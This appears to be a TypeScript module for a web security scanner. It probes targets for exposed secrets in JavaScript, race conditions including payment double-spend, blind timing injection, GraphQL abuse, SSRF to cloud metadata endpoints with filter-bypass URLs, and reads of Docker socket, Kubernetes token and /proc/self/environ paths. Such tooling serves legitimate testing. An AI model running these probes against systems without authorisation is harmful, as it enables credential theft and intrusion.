/**
 * obfuscation_engine — Advanced obfuscation detection and layered technique analysis.
 *
 * Addresses obfuscated targets using layered techniques that standard scanners miss:
 *   1. Client-side JavaScript obfuscation analysis
 *   2. Race condition detection (TOCTOU)
 *   3. Blind injection timing analysis with statistical correlation
 *   4. Distributed tracing correlation for path discovery
 *   5. WebSocket protocol testing
 *   6. GraphQL advanced techniques (introspection, batching, aliasing)
 *   7. Cloud-specific metadata exploitation
 *   8. Container escape detection
 */

import axios from 'axios';
import * as cheerio from 'cheerio';
import { v4 as uuidv4 } from 'uuid';
import * as net from 'net';
import * as tls from 'tls';

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface ObfuscationFinding {
  type: string;
  subtype: string;
  endpoint: string;
  gap: string;
  chain_potential: string | null;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  evidence?: any;
  confidence?: number;
}

export interface JavaScriptAnalysis {
  hasObfuscation: boolean;
  obfuscationType: string[];
  sensitiveEndpoints: string[];
  hiddenApis: string[];
  secretStrings: string[];
  hardcodedCreds: string[];
  framework: string;
  confidence: number;
}

export interface RaceConditionResult {
  endpoint: string;
  raceDetected: boolean;
  technique: string;
  gap: string;
  evidence: any;
  severity: string;
}

export interface TimingAnalysis {
  endpoint: string;
  payload: string;
  baselineTime: number;
  testTime: number;
  timeDiff: number;
  stdDev: number;
  isBlind: boolean;
  confidence: number;
}

export interface WebSocketFinding {
  endpoint: string;
  issue: string;
  gap: string;
  chain_potential: string;
  severity: string;
}

export interface GraphQLFinding {
  endpoint: string;
  issue: string;
  technique: string;
  gap: string;
  chain_potential: string;
  severity: string;
}

// ---------------------------------------------------------------------------
// JavaScript Obfuscation Analysis
// ---------------------------------------------------------------------------

export class ObfuscationEngine {
  /**
   * Analyze JavaScript for obfuscation patterns and hidden secrets
   */
  static async analyzeJavaScript(url: string, opts: { timeout?: number } = {}): Promise<JavaScriptAnalysis> {
    const timeout = opts.timeout ?? 10000;
    const result: JavaScriptAnalysis = {
      hasObfuscation: false,
      obfuscationType: [],
      sensitiveEndpoints: [],
      hiddenApis: [],
      secretStrings: [],
      hardcodedCreds: [],
      framework: 'unknown',
      confidence: 0,
    };

    try {
      const res = await axios.get(url, { timeout, validateStatus: () => true });
      const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

      // Detect obfuscation patterns
      const obfuscationPatterns = {
        hexEncoding: /\\x[0-9a-f]{2}/gi,
        unicodeEscapes: /\\u[0-9a-f]{4}/gi,
        base64: /[A-Za-z0-9+/]{20,}={0,2}/g,
        minified: /;(?!\s*[a-zA-Z_$])/g.test(body) && body.replace(/\s/g, '').length / body.length > 0.8,
        evalObfuscation: /eval\s*\(|atob\s*\(|String\.fromCharCode\(/gi,
        controlFlow: /while\s*\(\s*true\s*\)|for\s*\(\s*;\s*;\s*\)|if\s*\(\s*[^)]*\)\s*{\s*}\s*else\s*{\s*}/gi,
        stringArray: /_0x[0-9a-f]+|var\s+[a-z_$]{1,3}\s*=\s*\[/gi,
        deadCode: /\/\*\s*dead\s*code\s*\*\/|\/\/\s*unused|function\s+\w+\(\)\{\s*\}/gi,
      };

      for (const [type, pattern] of Object.entries(obfuscationPatterns)) {
        if (pattern.test(body)) {
          result.hasObfuscation = true;
          result.obfuscationType.push(type);
        }
      }

      // Extract sensitive endpoints
      const endpointPatterns = [
        /https?:\/\/[^\s"']+/gi,
        /\/api\/[^\s"']+/gi,
        /\/v\d+\/[^\s"']+/gi,
        /[a-z_]+:\/\/[^\s"']+/gi,
      ];

      for (const pattern of endpointPatterns) {
        const matches = body.match(pattern) || [];
        const sensitive = matches.filter(m => 
          m.includes('api') || m.includes('admin') || m.includes('auth') ||
          m.includes('secret') || m.includes('key') || m.includes('token')
        );
        result.sensitiveEndpoints.push(...sensitive);
      }

      // Detect hidden APIs (functions called via string/eval)
      const hiddenApiPatterns = [
        /["']([^"']+\/api\/[^"']+)["']/gi,
        /["']([^"']+\/v\d+\/[^"']+)["']/gi,
        /\$\.get\(["']([^"']+)["']/gi,
        /fetch\(["']([^"']+)["']/gi,
        /axios\.(get|post)\(["']([^"']+)["']/gi,
      ];

      for (const pattern of hiddenApiPatterns) {
        const matches = body.match(pattern) || [];
        result.hiddenApis.push(...matches);
      }

      // Extract potential secrets/credentials
      const secretPatterns = {
        apiKeys: /["']([a-z_]+[_-]?key[_-]?[a-z0-9_]{10,})["']/gi,
        apiSecrets: /["']([a-z_]+[_-]?secret[_-]?[a-z0-9_]{10,})["']/gi,
        tokens: /["']([a-z_]+[_-]?token[_-]?[a-z0-9._-]{20,})["']/gi,
        passwords: /["']password["']\s*:\s*["']([^"']{8,})["']/gi,
        bearerTokens: /["']Bearer\s+([A-Za-z0-9._-]{20,})["']/gi,
        awsKeys: /AKIA[0-9A-Z]{16}/g,
        jwt: /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g,
      };

      for (const [type, pattern] of Object.entries(secretPatterns)) {
        const matches = body.match(pattern) || [];
        if (type === 'hardcodedCreds') {
          result.hardcodedCreds.push(...matches);
        } else {
          result.secretStrings.push(...matches);
        }
      }

      // Detect framework
      const frameworkPatterns = {
        React: /react|ReactDOM|jsx|createelement/gi,
        Vue: /vue|createapp|definecomponent/gi,
        Angular: /angular|ngfor|ngif|rxjs/gi,
        jQuery: /\$\(|jquery/gi,
        Backbone: /backbone|model|collection/gi,
        Ember: /ember|handlebars/gi,
      };

      for (const [fw, pattern] of Object.entries(frameworkPatterns)) {
        if (pattern.test(body)) {
          result.framework = fw;
          break;
        }
      }

      // Calculate confidence based on findings
      const findingsCount = 
        result.obfuscationType.length + 
        result.sensitiveEndpoints.length + 
        result.hiddenApis.length + 
        result.secretStrings.length + 
        result.hardcodedCreds.length;
      result.confidence = Math.min(findingsCount / 10, 1.0);

    } catch (e) {
      // Return default on error
    }

    return result;
  }

  /**
   * Race condition detection (TOCTOU - Time-of-Check-Time-of-Use)
   */
  static async detectRaceConditions(
    url: string,
    opts: { timeout?: number; concurrency?: number } = {}
  ): Promise<RaceConditionResult[]> {
    const timeout = opts.timeout ?? 5000;
    const concurrency = opts.concurrency ?? 10;
    const results: RaceConditionResult[] = [];

    try {
      // Technique 1: Concurrent ID modification
      const idMatch = url.match(/\/(\d+)(?:\/|$|\?)/);
      if (idMatch) {
        const testId = parseInt(idMatch[1]);
        const raceUrl = url.replace(idMatch[0], `/${testId}`);

        // Send concurrent requests to modify the same resource
        const requests = Array.from({ length: concurrency }, (_, i) =>
          axios.post(raceUrl, JSON.stringify({ value: i, timestamp: Date.now() }), {
            timeout, validateStatus: () => true,
            headers: { 'Content-Type': 'application/json' },
          })
        );

        const responses = await Promise.allSettled(requests);
        const successful = responses.filter(r => r.status === 'fulfilled' && (r as any).value.status === 200);

        if (successful.length > 1) {
          results.push({
            endpoint: url,
            raceDetected: true,
            technique: 'Concurrent write',
            gap: 'Multiple concurrent writes accepted — potential race condition',
            evidence: { successful: successful.length, total: concurrency },
            severity: 'HIGH',
          });
        }
      }

      // Technique 2: File upload race condition
      if (url.includes('upload') || url.includes('file')) {
        const uploadPromises = Array.from({ length: 5 }, (_, i) =>
          axios.post(url, { file: `race_test_${i}.txt`, content: Date.now() }, {
            timeout, validateStatus: () => true,
            headers: { 'Content-Type': 'multipart/form-data' },
          })
        );

        const uploadResults = await Promise.allSettled(uploadPromises);
        const all200 = uploadResults.every(r => r.status === 'fulfilled' && (r as any).value.status === 200);

        if (all200) {
          results.push({
            endpoint: url,
            raceDetected: true,
            technique: 'Concurrent upload',
            gap: 'Concurrent file uploads accepted without rate limiting',
            evidence: { allSuccessful: true },
            severity: 'MEDIUM',
          });
        }
      }

      // Technique 3: Payment/transaction race
      if (url.includes('checkout') || url.includes('payment') || url.includes('purchase')) {
        const transactionId = uuidv4();
        const paymentPayload = { amount: 1, currency: 'USD', transaction_id: transactionId };

        const paymentPromises = Array.from({ length: 5 }, () =>
          axios.post(url, paymentPayload, {
            timeout, validateStatus: () => true,
            headers: { 'Content-Type': 'application/json' },
          })
        );

        const paymentResults = await Promise.allSettled(paymentPromises);
        const allSuccess = paymentResults.filter(r => r.status === 'fulfilled' && (r as any).value.status === 200);

        if (allSuccess.length > 1) {
          results.push({
            endpoint: url,
            raceDetected: true,
            technique: 'Payment race',
            gap: 'Multiple payment transactions with same ID accepted — double-spend vulnerability',
            evidence: { successful: allSuccess.length, transactionId },
            severity: 'CRITICAL',
          });
        }
      }

    } catch (e) {
      // Log error but continue
    }

    return results;
  }

  /**
   * Blind injection timing analysis with statistical correlation
   */
  static async analyzeBlindTiming(
    url: string,
    basePayload: string,
    delayPayload: string,
    opts: { samples?: number; threshold?: number } = {}
  ): Promise<TimingAnalysis> {
    const samples = opts.samples ?? 10;
    const threshold = opts.threshold ?? 1000;

    const result: TimingAnalysis = {
      endpoint: url,
      payload: delayPayload,
      baselineTime: 0,
      testTime: 0,
      timeDiff: 0,
      stdDev: 0,
      isBlind: false,
      confidence: 0,
    };

    try {
      // Collect baseline timing samples
      const baselineTimes: number[] = [];
      for (let i = 0; i < samples; i++) {
        const start = Date.now();
        await axios.get(url, {
          timeout: 10000, validateStatus: () => true,
          params: { test: basePayload },
        });
        baselineTimes.push(Date.now() - start);
      }

      // Collect test timing samples
      const testTimes: number[] = [];
      for (let i = 0; i < samples; i++) {
        const start = Date.now();
        await axios.get(url, {
          timeout: 10000, validateStatus: () => true,
          params: { test: delayPayload },
        });
        testTimes.push(Date.now() - start);
      }

      // Calculate statistics
      const avgBaseline = baselineTimes.reduce((a, b) => a + b, 0) / baselineTimes.length;
      const avgTest = testTimes.reduce((a, b) => a + b, 0) / testTimes.length;

      const baselineVariance = baselineTimes.reduce((sum, t) => sum + Math.pow(t - avgBaseline, 2), 0) / baselineTimes.length;
      const testVariance = testTimes.reduce((sum, t) => sum + Math.pow(t - avgTest, 2), 0) / testTimes.length;

      const baselineStdDev = Math.sqrt(baselineVariance);
      const testStdDev = Math.sqrt(testVariance);

      result.baselineTime = avgBaseline;
      result.testTime = avgTest;
      result.timeDiff = avgTest - avgBaseline;
      result.stdDev = Math.max(baselineStdDev, testStdDev);

      // Determine if blind injection detected
      // Condition: test time is significantly higher than baseline (beyond statistical noise)
      const isSignificant = result.timeDiff > threshold && result.timeDiff > (3 * result.stdDev);
      result.isBlind = isSignificant;

      // Calculate confidence based on statistical significance
      if (isSignificant) {
        result.confidence = Math.min((result.timeDiff / (threshold + result.stdDev)) * 0.9, 0.95);
      } else {
        result.confidence = 0;
      }

    } catch (e) {
      // Return default on error
    }

    return result;
  }

  /**
   * Distributed tracing correlation for path discovery
   */
  static async correlateTracing(
    url: string,
    opts: { timeout?: number; headers?: Record<string, string> } = {}
  ): Promise<ObfuscationFinding[]> {
    const timeout = opts.timeout ?? 5000;
    const findings: ObfuscationFinding[] = [];

    try {
      const res = await axios.get(url, { timeout, validateStatus: () => true, headers: opts.headers });
      const traceHeaders = [
        'x-trace-id', 'x-request-id', 'x-correlation-id', 'x-b3-traceid',
        'x-datadog-trace-id', 'x-cloud-trace-context', 'uber-trace-id',
        'x-amzn-requestid', 'x-amz-cf-id', 'x-vcap-request-id',
      ];

      const foundTraces: Record<string, string> = {};
      for (const header of traceHeaders) {
        const value = res.headers[header];
        if (value) {
          foundTraces[header] = String(value);
        }
      }

      if (Object.keys(foundTraces).length > 0) {
        findings.push({
          type: 'Tracing Disclosure',
          subtype: 'Distributed tracing headers',
          endpoint: url,
          gap: 'Application exposes distributed tracing headers',
          chain_potential: 'Trace correlation may reveal internal service topology and timing patterns',
          severity: 'LOW',
          evidence: foundTraces,
          confidence: 0.9,
        });
      }

      // Check for span metadata in response body
      const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
      const spanPatterns = [
        /span[_-]?id[:\s]+[a-f0-9-]{36}/gi,
        /trace[_-]?id[:\s]+[a-f0-9-]{36}/gi,
        /parent[_-]?span[:\s]+[a-f0-9-]{36}/gi,
        /jaeger[:\s][a-f0-9-]{36}/gi,
        /zipkin[:\s][a-f0-9-]{36}/gi,
      ];

      for (const pattern of spanPatterns) {
        const matches = body.match(pattern) || [];
        if (matches.length > 0) {
          findings.push({
            type: 'Tracing Disclosure',
            subtype: 'Span metadata in body',
            endpoint: url,
            gap: 'Application exposes span/trace metadata in response body',
            chain_potential: 'Internal service topology leak, request path reconstruction',
            severity: 'MEDIUM',
            evidence: { matches: matches.slice(0, 5) },
            confidence: 0.8,
          });
          break;
        }
      }

    } catch (e) {
      // Continue on error
    }

    return findings;
  }

  /**
   * WebSocket protocol testing
   */
  static async testWebSocket(
    wsUrl: string,
    opts: { timeout?: number } = {}
  ): Promise<WebSocketFinding[]> {
    const timeout = opts.timeout ?? 5000;
    const findings: WebSocketFinding[] = [];

    try {
      // Convert ws:// to http:// for initial connection test
      const httpUrl = wsUrl.replace(/^ws:/, 'http:').replace(/^wss:/, 'https:');

      // Test if WebSocket endpoint is accessible via HTTP (often reveals info)
      try {
        const res = await axios.get(httpUrl, { timeout, validateStatus: () => true });
        const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

        if (res.status === 200) {
          findings.push({
            endpoint: wsUrl,
            issue: 'WebSocket accessible via HTTP',
            gap: 'WebSocket endpoint returns HTTP response without upgrade',
            chain_potential: 'Cross-protocol confusion, potential XSS via WebSocket handshake',
            severity: 'MEDIUM',
          });
        }

        // Check for WebSocket version disclosure
        if (/Sec-WebSocket-Version/i.test(body) || /websocket/i.test(body)) {
          findings.push({
            endpoint: wsUrl,
            issue: 'WebSocket version disclosure',
            gap: 'WebSocket implementation details exposed',
            chain_potential: 'Fingerprinting for targeted exploits',
            severity: 'LOW',
          });
        }
      } catch {
        // HTTP access failed - this is normal for WS-only endpoints
      }

      // Note: Full WebSocket testing requires ws library, which may not be available
      // This is a placeholder for future enhancement with actual WebSocket client

    } catch (e) {
      // Continue on error
    }

    return findings;
  }

  /**
   * GraphQL advanced techniques
   */
  static async testGraphQL(
    url: string,
    opts: { timeout?: number } = {}
  ): Promise<GraphQLFinding[]> {
    const timeout = opts.timeout ?? 5000;
    const findings: GraphQLFinding[] = [];

    try {
      // Test 1: Introspection query
      const introspectionQuery = `
        query {
          __schema {
            types {
              name
              fields {
                name
                type {
                  name
                  kind
                }
              }
            }
          }
        }
      `;

      const introRes = await axios.post(url, { query: introspectionQuery }, {
        timeout, validateStatus: () => true,
        headers: { 'Content-Type': 'application/json' },
      });

      if (introRes.status === 200 && introRes.data.data?.__schema) {
        findings.push({
          endpoint: url,
          issue: 'GraphQL introspection enabled',
          technique: 'Introspection query',
          gap: 'Full schema introspection is enabled - exposes all types, fields, and structure',
          chain_potential: 'Complete API surface enumeration, hidden field discovery',
          severity: 'HIGH',
        });
      }

      // Test 2: Query batching
      const batchedQuery = {
        query: `query { user(id: 1) { id name } user(id: 2) { id name } user(id: 3) { id name } }`,
      };

      const batchRes = await axios.post(url, batchedQuery, {
        timeout, validateStatus: () => true,
        headers: { 'Content-Type': 'application/json' },
      });

      if (batchRes.status === 200 && batchRes.data.data) {
        findings.push({
          endpoint: url,
          issue: 'Query batching accepted',
          technique: 'Batched queries',
          gap: 'GraphQL accepts batched queries - potential for rate limit bypass',
          chain_potential: 'Enumerate multiple resources in single request, bypass per-query rate limits',
          severity: 'MEDIUM',
        });
      }

      // Test 3: Alias abuse
      const aliasQuery = {
        query: `query { 
          u1: user(id: 1) { id name } 
          u2: user(id: 2) { id name } 
          u3: user(id: 3) { id name } 
        }`,
      };

      const aliasRes = await axios.post(url, aliasQuery, {
        timeout, validateStatus: () => true,
        headers: { 'Content-Type': 'application/json' },
      });

      if (aliasRes.status === 200 && aliasRes.data.data?.u1 && aliasRes.data.data?.u2) {
        findings.push({
          endpoint: url,
          issue: 'Alias abuse possible',
          technique: 'Field aliasing',
          gap: 'GraphQL accepts field aliases - potential for data exfiltration bypass',
          chain_potential: 'Request same field multiple times with different names, bypass field-level rate limits',
          severity: 'MEDIUM',
        });
      }

      // Test 4: Depth limit bypass
      const deepQuery = {
        query: `query {
          user(id: 1) {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      name
                    }
                  }
                }
              }
            }
          }
        }`,
      };

      const deepRes = await axios.post(url, deepQuery, {
        timeout, validateStatus: () => true,
        headers: { 'Content-Type': 'application/json' },
      });

      if (deepRes.status === 200 && deepRes.data.data) {
        findings.push({
          endpoint: url,
          issue: 'No depth limit enforced',
          technique: 'Deep nesting',
          gap: 'GraphQL accepts deeply nested queries - potential for DoS',
          chain_potential: 'Resource exhaustion via recursive queries',
          severity: 'HIGH',
        });
      }

    } catch (e) {
      // Continue on error
    }

    return findings;
  }

  /**
   * Cloud-specific metadata exploitation
   */
  static async testCloudMetadata(
    baseUrl: string,
    opts: { timeout?: number } = {}
  ): Promise<ObfuscationFinding[]> {
    const timeout = opts.timeout ?? 5000;
    const findings: ObfuscationFinding[] = [];

    // Cloud metadata endpoints with bypass variants
    const cloudTests = [
      {
        name: 'AWS IMDSv1',
        url: 'http://169.254.169.254/latest/meta-data/',
        bypass: [
          'http://[::ffff:169.254.169.254]/latest/meta-data/',
          'http://169.254.169.254.nip.io/latest/meta-data/',
          'http://0xA9FEA9FE/latest/meta-data/',
        ],
        markers: ['ami-id', 'instance-id', 'iam', 'security-credentials'],
      },
      {
        name: 'GCP Metadata',
        url: 'http://metadata.google.internal/computeMetadata/v1/',
        bypass: [
          'http://metadata.google.internal/computeMetadata/v1beta1/',
          'http://169.254.169.254/computeMetadata/v1/',
        ],
        markers: ['computeMetadata', 'project-id', 'instance'],
      },
      {
        name: 'Azure Metadata',
        url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        bypass: [
          'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        ],
        markers: ['compute', 'vmId', 'network'],
      },
    ];

    for (const cloud of cloudTests) {
      try {
        // Test primary endpoint via SSRF proxy
        const ssrfPayload = cloud.url;
        const testUrl = `${baseUrl}?url=${encodeURIComponent(ssrfPayload)}`;

        const res = await axios.get(testUrl, { timeout, validateStatus: () => true });
        const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

        const markersFound = cloud.markers.filter(m => body.includes(m));
        if (markersFound.length > 0) {
          findings.push({
            type: 'Cloud Metadata Exposure',
            subtype: cloud.name,
            endpoint: baseUrl,
            gap: `SSRF to ${cloud.name} metadata endpoint successful`,
            chain_potential: 'Cloud credential theft, instance takeover',
            severity: 'CRITICAL',
            evidence: { markers: markersFound },
            confidence: 0.9,
          });
        }

        // Test bypass variants
        for (const bypass of cloud.bypass) {
          try {
            const bypassUrl = `${baseUrl}?url=${encodeURIComponent(bypass)}`;
            const bypassRes = await axios.get(bypassUrl, { timeout, validateStatus: () => true });
            const bypassBody = typeof bypassRes.data === 'string' ? bypassRes.data : JSON.stringify(bypassRes.data);

            const bypassMarkers = cloud.markers.filter(m => bypassBody.includes(m));
            if (bypassMarkers.length > 0) {
              findings.push({
                type: 'Cloud Metadata Bypass',
                subtype: `${cloud.name} bypass`,
                endpoint: baseUrl,
                gap: `SSRF bypass variant successful: ${bypass}`,
                chain_potential: 'Bypass IP-based filtering for metadata access',
                severity: 'CRITICAL',
                evidence: { markers: bypassMarkers, bypass },
                confidence: 0.85,
              });
            }
          } catch {
            // Continue on error
          }
        }
      } catch {
        // Continue on error
      }
    }

    return findings;
  }

  /**
   * Container escape detection
   */
  static async testContainerEscape(
    url: string,
    opts: { timeout?: number } = {}
  ): Promise<ObfuscationFinding[]> {
    const timeout = opts.timeout ?? 5000;
    const findings: ObfuscationFinding[] = [];

    try {
      // Test 1: Docker socket exposure
      const dockerTests = [
        '/var/run/docker.sock',
        '/docker.sock',
        '/.dockerenv',
      ];

      for (const dockerPath of dockerTests) {
        try {
          const testUrl = `${url}?path=${encodeURIComponent(dockerPath)}`;
          const res = await axios.get(testUrl, { timeout, validateStatus: () => true });
          const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

          if (res.status === 200 && (body.includes('containers') || body.includes('images') || body.includes('version'))) {
            findings.push({
              type: 'Container Escape',
              subtype: 'Docker socket exposure',
              endpoint: url,
              gap: `Docker socket accessible via path: ${dockerPath}`,
              chain_potential: 'Full container host compromise - execute commands, escape to host',
              severity: 'CRITICAL',
              evidence: { path: dockerPath, response: body.substring(0, 500) },
              confidence: 0.95,
            });
          }
        } catch {
          // Continue on error
        }
      }

      // Test 2: Kubernetes API exposure
      const k8sTests = [
        '/api/v1/namespaces',
        '/api/v1/pods',
        '/api/v1/services',
        '/var/run/secrets/kubernetes.io/serviceaccount/token',
      ];

      for (const k8sPath of k8sTests) {
        try {
          const testUrl = `${url}?path=${encodeURIComponent(k8sPath)}`;
          const res = await axios.get(testUrl, { timeout, validateStatus: () => true });
          const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

          if (res.status === 200 && (body.includes('items') || body.includes('kind') || body.includes('apiVersion'))) {
            findings.push({
              type: 'Container Escape',
              subtype: 'Kubernetes API exposure',
              endpoint: url,
              gap: `Kubernetes API accessible via path: ${k8sPath}`,
              chain_potential: 'Cluster compromise - access pods, secrets, services',
              severity: 'CRITICAL',
              evidence: { path: k8sPath, response: body.substring(0, 500) },
              confidence: 0.95,
            });
          }
        } catch {
          // Continue on error
        }
      }

      // Test 3: Cgroup/mount escape indicators
      const cgroupTests = [
        '/proc/self/cgroup',
        '/proc/self/mounts',
        '/proc/self/environ',
      ];

      for (const cgroupPath of cgroupTests) {
        try {
          const testUrl = `${url}?path=${encodeURIComponent(cgroupPath)}`;
          const res = await axios.get(testUrl, { timeout, validateStatus: () => true });
          const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

          if (res.status === 200) {
            const isContainer = body.includes('docker') || body.includes('kubepods') || body.includes('containerd');
            if (isContainer) {
              findings.push({
                type: 'Container Escape',
                subtype: 'Container indicators',
                endpoint: url,
                gap: `Container environment indicators exposed via path: ${cgroupPath}`,
                chain_potential: 'Confirm containerized environment, inform escape attempts',
                severity: 'INFO',
                evidence: { path: cgroupPath, response: body.substring(0, 500) },
                confidence: 0.8,
              });
            }
          }
        } catch {
          // Continue on error
        }
      }

    } catch (e) {
      // Continue on error
    }

    return findings;
  }
}
